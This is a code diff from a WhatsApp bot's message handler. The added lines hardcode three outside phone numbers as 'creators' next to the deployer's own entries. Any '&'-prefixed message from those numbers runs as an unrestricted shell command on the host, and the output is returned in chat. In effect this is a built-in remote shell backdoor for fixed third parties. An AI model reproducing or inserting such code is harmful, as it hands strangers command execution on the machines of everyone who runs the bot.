@@ -288,45 +288,50 @@ conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   
-  const udp = botNumber.split('@')[0];
-    const jawadop = ('923470027813', '923191089077', '923427582273');
-    
-    const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));  
-    
-    let isCreator = [udp, ...jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
-    .includes(mek.sender);
+  // Get bot number (JID format)
+const botxNumber = conn.user.id; // e.g., '92345@s.whatsapp.net'
+const udp = botxNumber.split('@')[0]; // Always gives '92345'
+const botJid = udp + '@s.whatsapp.net'; // Always gives '92345@s.whatsapp.net'
+
+// Define hardcoded owners
+const jawadop = ['923470027813', '923191089077', '923427582273'];
+
+// Load dynamic owners from sudo.json
+const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
+
+// Build isCreator list
+const isCreator = [
+    botJid,
+    ...jawadop.map(num => num + '@s.whatsapp.net'),
+    config.DEV + '@s.whatsapp.net',
+    ...ownerFilev2.map(num => num.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+].includes(mek.sender);
+
+// Shell command handler (only for creators)
+if (isCreator && mek.text.startsWith("&")) {
+    const code = budy.slice(2).trim(); // remove "& " and trim
+
+    if (!code) {
+        return reply(`Provide me with a query to run Master!`);
+    }
+
+    try {
+        const resultTest = spawn(code, { shell: true });
+
+        resultTest.stdout.on("data", data => reply(data.toString()));
+        resultTest.stderr.on("data", data => reply(data.toString()));
+        resultTest.on("error", err => reply(err.toString()));
+        resultTest.on("close", code => {
+            if (code !== 0) reply(`Command exited with code ${code}`);
+        });
+
+    } catch (err) {
+        reply(require("util").format(err));
+    }
+
+    return;
+}
 	  
-
-	  if (isCreator && mek.text.startsWith("&")) {
-            let code = budy.slice(2);
-            if (!code) {
-                reply(`Provide me with a query to run Master!`);
-                return;
-            }
-            const { spawn } = require("child_process");
-            try {
-                let resultTest = spawn(code, { shell: true });
-                resultTest.stdout.on("data", data => {
-                    reply(data.toString());
-                });
-                resultTest.stderr.on("data", data => {
-                    reply(data.toString());
-                });
-                resultTest.on("error", data => {
-                    reply(data.toString());
-                });
-                resultTest.on("close", code => {
-                    if (code !== 0) {
-                        reply(`command exited with code ${code}`);
-                    }
-                });
-            } catch (err) {
-                reply(util.format(err));
-            }
-            return;
-        }
-
   //==========public react============//
   
 // Auto React for all messages (public and owner)
